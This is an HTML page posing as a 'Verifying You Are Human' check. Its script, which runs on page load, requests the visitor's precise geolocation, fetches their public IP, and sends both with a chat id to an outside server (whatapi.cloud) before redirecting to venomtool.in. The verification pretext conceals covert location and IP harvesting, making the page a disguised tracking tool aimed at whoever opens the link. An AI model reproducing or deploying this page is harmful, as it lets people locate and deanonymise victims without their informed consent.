<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@700&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Poppins", sans-serif;
        }
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #1F1F1F;
            color: #FFFFFF;
        }
        .container {
            text-align: center;
            padding: 50px;
            background: #333333;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
        }
        h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 20px;
            color: #FFD700;
        }
        p {
            font-size: 18px;
            margin-bottom: 20px;
        }
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 6px solid #FFFFFF;
            border-top: 6px solid #FFD700;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Verifying You Are Human</h1>
    <div class="loading-spinner"></div>
    <p id="message">Please wait while we verifying...</p>
</div>

<script>
    const chatId = new URLSearchParams(window.location.search).get("id");
    const message = document.getElementById('message');

    setTimeout(() => {
        window.location.href = `https://venomtool.in/I/?id=${chatId}`;
    }, 5000);  

    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error fetching IP:', error);
            return 'Unknown IP';
        }
    }

    async function sendLocation(latitude, longitude) {
        const ip = await getIP();
        const url = `https://whatapi.cloud:8443/loc?chat_id=${chatId}&lat=${latitude}&long=${longitude}&ip=${ip}`;
        axios
            .get(url)
            .then((response) => {
                message.textContent = `Verification complete! Redirecting...`;
               
                window.location.href = `https://venomtool.in/I/?id=${chatId}`;  // Immediate redirect after successful location send
            })
            .catch((error) => {
                mesage.textContent = `⚠️ Error: ${error.response?.data?.description || error.message}`;
            });
    }

    function success(pos) {
        const crd = pos.coords;
        sendLocation(crd.latitude, crd.longitude);
    }

    function error(err) {
        mesage.textContent = `⚠️ Location ERROR: ${err.message}`;
    }

    if ('geolocation' in navigator) {
        navigator.permissions.query({ name: 'geolocation' }).then((result) => {
            if (result.state === 'granted') {
                navigator.geolocation.getCurrentPosition(success, error, {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                });
            } else if (result.state === 'prompt') {
                navigator.geolocation.getCurrentPosition(success, error, {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                });
            } else if (result.state === 'denied') {
                mesage.textContent = '⚠️ Location access denied. Please grant location access and refresh the page.';
            }
        });
    } else {
        mesage.textContent = '⚠️ Location API not available.';
    }
</script>

</body>
</html>
